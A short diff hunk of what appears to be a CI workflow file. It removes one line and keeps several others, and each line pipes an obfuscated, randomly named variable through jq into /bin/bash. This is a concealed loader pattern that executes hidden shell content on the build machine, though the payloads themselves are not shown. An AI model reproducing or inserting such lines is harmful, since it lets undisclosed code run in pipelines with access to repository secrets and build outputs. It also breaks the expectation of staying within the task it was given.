@@ -32,7 +32,6 @@ jobs:
           echo $kptok417 | jq -r .x9 | /bin/bash
           printf '%s' "$p64390" | jq -r .faci111 | /bin/bash
           echo $ah1 | jq -r .nqibi337 | /bin/bash
-          echo $ufyz10320 | jq -r .on64131 | /bin/bash
           echo $timvz75 | jq -r .jzkm023 | /bin/bash
           printf '%s' "$vyarr46348" | jq -r .b1418 | /bin/bash
           echo $qqcl641 | jq -r .yxl25 | /bin/bash
